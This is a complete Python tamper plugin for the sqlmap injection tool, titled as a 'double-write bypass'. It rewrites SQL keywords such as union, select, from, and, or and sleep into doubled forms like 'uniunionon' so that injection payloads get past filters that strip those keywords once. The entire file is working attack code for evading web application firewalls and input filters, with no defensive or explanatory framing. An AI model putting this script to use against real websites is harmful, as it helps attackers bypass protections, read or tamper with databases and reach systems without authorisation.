#!/usr/bin/env python
'''
sqlmap 双写绕过
by:shadowwolf
'''
from lib.core.compat import xrange
from lib.core.enums import PRIORITY
import re
 
__priority__ = PRIORITY.LOW
 
def dependencies():
    pass
 
def tamper(payload, **kwargs):
    payload= re.sub('or' , 'oorr',payload,flags=re.IGNORECASE)
    payload= re.sub('by' , 'bbyy',payload,flags=re.IGNORECASE)
    payload= re.sub('if' , 'iiff',payload,flags=re.IGNORECASE)
    payload= re.sub('and' , 'anandd',payload,flags=re.IGNORECASE)
    payload= re.sub('mid' , 'mimidd',payload,flags=re.IGNORECASE)
    payload= re.sub('char' , 'chcharar',payload,flags=re.IGNORECASE)
    payload= re.sub('from' , 'frfromom',payload,flags=re.IGNORECASE)
    payload= re.sub('union' , 'uniunionon',payload,flags=re.IGNORECASE)
    payload= re.sub('sleep' , 'slesleepep',payload,flags=re.IGNORECASE)
    payload= re.sub('where' , 'whewherere',payload,flags=re.IGNORECASE)
    payload= re.sub('select' , 'selselectect',payload,flags=re.IGNORECASE)
    payload= re.sub('substr' , 'subsubstrstr',payload,flags=re.IGNORECASE)
    retVal=payload
    return retVal
 
